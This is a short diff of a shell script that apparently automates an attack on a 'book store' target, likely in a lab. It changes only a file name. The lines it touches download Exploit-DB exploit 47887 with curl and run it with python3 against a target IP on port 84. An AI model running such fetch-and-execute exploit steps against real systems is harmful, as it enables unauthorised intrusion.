@@ -19,9 +19,9 @@ echo "--> Session initiated : $PHPSESSID"
 
 # Retrieve exploit script for book store
 echo "2 - RETRIEVING EXPLOIT SCRIPT"
-curl -X GET https://www.exploit-db.com/download/47887 -o /work/2-47887.py
+curl -X GET https://www.exploit-db.com/download/47887 -o /work/6-47887.py
 
 # Perform exploit
 echo "3 - PERFORMING EXPLOIT"
-python3 /work/2-47887.py $target_ip:84
+python3 /work/6-47887.py $target_ip:84
 
